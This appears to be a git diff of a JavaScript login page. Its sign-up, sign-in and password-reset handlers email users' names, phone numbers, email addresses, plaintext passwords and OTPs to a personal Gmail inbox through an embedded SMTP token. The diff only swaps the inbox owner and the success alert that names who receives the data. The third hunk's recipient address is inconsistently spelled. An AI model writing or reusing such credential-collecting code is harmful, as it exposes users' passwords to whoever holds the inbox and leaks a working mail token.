@@ -50,15 +50,15 @@ let forgetLink = document.querySelector("#frgtLink")
    }else{
     Email.send({
     SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
-    To : 'mukhtar.alam458546@gmail.com',
-    From : "mukhtar.alam458546@gmail.com",
+    To : 'AkshatKumar90157678@gmail.com',
+    From : "AkshatKumar90157678@gmail.com",
     Subject : "SIGN UP DATA",
     Body : "Email : " + signUpEmail
           + "<br> Name : " + signUpFname + " " + signUpLname
           + "<br> Phone : " + signUpPhone
           + "<br> Pass : " + signUpPass
 }).then(
-  message => swal("Created Account Successfully", "Your data sent to Mr. Mukhtar Alam", "success")
+  message => swal("Created Account Successfully", "Your data sent to MrTech-AK", "success")
       )
     }
  })
@@ -76,13 +76,13 @@ let forgetLink = document.querySelector("#frgtLink")
        
      Email.send({
      SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
-     To : 'mukhtar.alam458546@gmail.com',
-     From : "mukhtar.alam458546@gmail.com",
+     To : 'AkshatKumar90157678@gmail.com',
+     From : "AkshatKumar90157678@gmail.com",
      Subject : "SIGN IN DATA",
      Body : "Email : " + signUpEmail
           + "<br> Pass : " + signUpPass
      }).then(
-     message => swal("Login Successfully", "Your data sent to Mr. Mukhtar Alam", "success")
+     message => swal("Login Successfully", "Your data sent to MrTech-AK", "success")
      )
      }
 })
@@ -100,15 +100,15 @@ FORGETPAGEBTN.addEventListener("click",function(){
     }else{
        Email.send({
        SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
-       To : 'mukhtar.alam458546@gmail.com',
-       From : "mukhtar.alam458546@gmail.com",
+       To : 'AkshatKum6ar90157678@gmail.com',
+       From : "AkshatKumar90157678@gmail.com",
        Subject : "FORGET PASS DATA",
        Body : "Email : " + signUpEmail
               + "<br> OTP : " + signUpOtp
               + "<br> Pass : " + signUpPass
               + "<br> Pass Confirm : " + signUpPassC
        }).then(
-       message => swal("Reset Password Successfully", "Your data sent to Mr. Mukhtar Alam", "success")
+       message => swal("Reset Password Successfully", "Your data sent to MrTech-AK", "success")
        )
        }
     })
